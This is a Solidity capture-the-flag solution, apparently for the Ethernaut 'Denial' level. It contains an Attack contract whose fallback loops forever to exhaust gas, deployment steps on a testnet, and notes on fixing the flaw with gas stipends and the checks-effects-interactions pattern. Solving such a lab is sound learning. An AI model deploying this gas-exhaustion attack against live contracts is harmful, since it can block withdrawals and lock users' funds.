pragma solidity ^0.6.0;

//can use only solidty version 0.6.0
contract Attack {
  // Denial.withdraw() > partner.call will call this fallback function and it will consumes all gas.
  fallback() payable external {
    while(true){}
  }
}

/*

  - Deploy Attack contract with solidity version 0.6.0
  - call function setWithdrawPartner by passing parameter attck address
  await contract.setWithdrawPartner('0x3EA142730EE9CbDc3Dd7B0F76aEB1974938378b9')
  https://sepolia.etherscan.io/tx/0x0821f9ac02e2b923f5b91575315b8b3200c715a56233183340f832d833f607ac
  
  Result

  This level demostrates that external calls to unknow contracts can still create
  denial of sevice attack vector if a fixed amount of gas in not specified.

  if you are using a low level call to continue executing in the event an external call revert,
  ensure that you specify a fixed gas stipend. For examplac call.gas(100000).value().

  Typically one should followthe check-effects-interactions pattern (https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern)
  to avoid reentrancy attack, there can be otehr circumstances (such as multiple external calls at the end of a function)
  where issues such as this can aris

  Note: An external CALL can use at most 63/64 of the gas cureently available at the time of the CALL.
  Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas
  (i.e. one such that 1/64 of  the gas is capable of completing the remaining opcodes in the parent call)
  can be used to mitigate this particular attack.

  What need to fixed in Denial contract?
  1. use check-effects-interactions pattern for 
    - add checking the amount transferred
  2. Low level 'call' need to specify the amount of gas
    - receiver.call.gas(10000).value();
*/